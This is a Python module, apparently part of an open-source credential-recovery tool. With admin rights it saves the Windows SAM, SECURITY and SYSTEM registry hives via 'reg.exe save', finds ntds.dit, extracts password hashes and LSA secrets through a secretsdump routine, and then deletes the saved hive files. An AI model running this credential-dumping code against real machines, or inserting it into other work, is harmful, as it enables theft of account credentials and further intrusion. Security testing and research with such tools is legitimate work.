import subprocess
import os, sys
from secretsdump import retrieve_hash
from config.header import Header
from config.write_output import print_debug
from ctypes import *
import logging
from config.moduleInfo import ModuleInfo

class Secrets(ModuleInfo):
	def __init__(self):
		options = {'command': '-s', 'action': 'store_true', 'dest': 'secrets', 'help': 'Windows secrets (hashes, lsa secrets, etc.)'}
		ModuleInfo.__init__(self, 'Windows secrets', 'windows', options)
		
		self.sysFile = ['sam', 'security', 'system']
		self.address = 'LOCAL'
		self.ntds = os.environ['systemroot'] + os.sep + 'ntds' + os.sep + 'ntds.dit'
		if not os.path.exists(self.ntds):
			self.ntds = None
		self.history =  True
		
	# check if files have been saved
	def check_existing_systemFiles(self):
		for f in self.sysFile:
			if not os.path.exists('%s.save' % f):
				return False
		return True
	
	def delete_existing_systemFiles(self):
		for f in self.sysFile:
			os.remove('%s.save' % f)
	
	def run(self):
		# Need admin privileges
		if not windll.Shell32.IsUserAnAdmin():
			if logging.getLogger().isEnabledFor(logging.INFO) == True:
				Header().title('Windows Secrets')
			print_debug('WARNING', '[!] This script should be run as admin!')
			return
		
		# print the title
		Header().title('Windows Secrets')
		
		# if hives already exists
		if self.check_existing_systemFiles():
			self.delete_existing_systemFiles() # delete it
		
		# save system hives
		for f in self.sysFile:
			try:
				subprocess.Popen('reg.exe save hklm\%s %s.save' % (f,f) , shell=True, stdout=subprocess.PIPE).stdout.read()
			except Exception,e:
				print_debug('DEBUG', '{0}'.format(e))
				print_debug('ERROR', 'Failed to save %s hive' % f)
				return


		if not self.check_existing_systemFiles():
			print_debug('WARNING', 'Remove existing hive files and launch it again.')
			return
		
		retrieve_hash(self.address, '%s.save' % self.sysFile[2], '%s.save' % self.sysFile[1], '%s.save' % self.sysFile[0], self.ntds, self.history)
		
		# remove hives files
		self.delete_existing_systemFiles()


